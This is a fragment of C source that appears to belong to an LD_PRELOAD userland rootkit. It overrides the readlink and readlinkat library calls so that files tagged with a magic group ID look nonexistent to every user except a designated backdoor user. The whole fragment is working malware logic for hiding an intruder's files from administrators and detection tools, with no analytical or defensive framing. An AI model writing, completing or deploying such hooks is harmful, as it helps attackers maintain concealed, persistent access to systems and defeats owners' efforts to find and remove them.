ssize_t readlink(const char *pathname, char *buf, size_t bufsiz)
{
    HOOK(o_readlink, CREADLINK);
    if(is_bdusr()) return o_readlink(pathname, buf, bufsiz);
    if(hxstat(pathname,MGID,32)){ errno=ENOENT; return -1; }
    return o_readlink(pathname, buf, bufsiz);
}

ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz)
{
    HOOK(o_readlinkat, CREADLINKAT);
    if(is_bdusr()) return o_readlinkat(dirfd, pathname, buf, bufsiz);
    if(hxstat(pathname,MGID,32) || hfxstat(dirfd,MGID,32)){ errno=ENOENT; return -1; }
    return o_readlinkat(dirfd, pathname, buf, bufsiz);
}
